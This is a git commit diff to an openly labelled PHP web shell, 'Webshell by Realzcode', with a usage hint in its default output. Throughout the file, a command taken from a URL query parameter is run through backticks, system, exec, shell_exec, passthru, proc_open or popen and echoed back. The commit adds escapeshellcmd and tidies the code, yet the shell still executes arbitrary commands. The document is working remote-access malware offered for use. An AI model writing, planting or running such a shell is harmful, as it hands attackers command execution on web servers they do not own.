c04e916979afe95bc542c23dc6db95abdf78aea1
Realz Code <114070103+realzcode@users.noreply.github.com>
2022-10-06 16:07:47 +0700

    Webshell
    Webshell by Realzcode

--- webshell.php
+++ webshell.php
@@ -3,43 +3,49 @@
  * ----------
  * By @realzcode
  */
-switch (@$_GET['m']) {
+$x = escapeshellcmd(@$_GET["x"]);
+switch (@$_GET["m"]) {
 	case 'r':
-		echo `$_GET[x]`;
+		echo `$x`;
 		break;
 	case 'e':
-		echo system($_GET["x"]);
+		echo system($x);
 		break;
 	case 'a':
-		echo exec($_GET["x"]);
+		$y = null;
+		$z = null;
+		exec($x, $y, $z);
+		foreach ($y as $k => $v) {
+			echo $v . "\n";
+		}
 		break;
 	case 'l':
-		echo shell_exec($_GET["x"]);
+		echo shell_exec($x);
 		break;
 	case 'z':
-		echo passthru($_GET["x"]);
+		echo passthru($x);
 		break;
 	case 'c':
-		$x = array(
-			0 => array("pipe", "r"), 
-			1 => array("pipe", "w"), 
-			2 => array("file", "php://temp", "a") 
-		); 
-		$y = proc_open($_GET["x"], $x, $z); 
-		if (is_resource($y)) { 
-			fclose($z[0]); 
-			while (!feof($z[1])) { 
+		$v = array(
+			0 => array("pipe", "r"),
+			1 => array("pipe", "w"),
+			2 => array("file", "php://temp", "a")
+		);
+		$y = proc_open($x, $v, $z);
+		if (is_resource($y)) {
+			fclose($z[0]);
+			while (!feof($z[1])) {
 				echo fgets($z[1], 1024);
 			}
-			fclose($z[1]); 
+			fclose($z[1]);
 			$c = proc_close($y);
 		}
 		break;
 	case 'o':
-		$x = popen($_GET["x"], "r"); 
-		$y = fread($x, 2096); 
-		echo $y; 
-		pclose($x); 
+		$v = popen($x, "r");
+		$y = fread($v, 2096);
+		echo $y;
+		pclose($v);
 		break;
 	default:
 		echo "* Webshell by Realzcode * [?m=r&x=ver]";
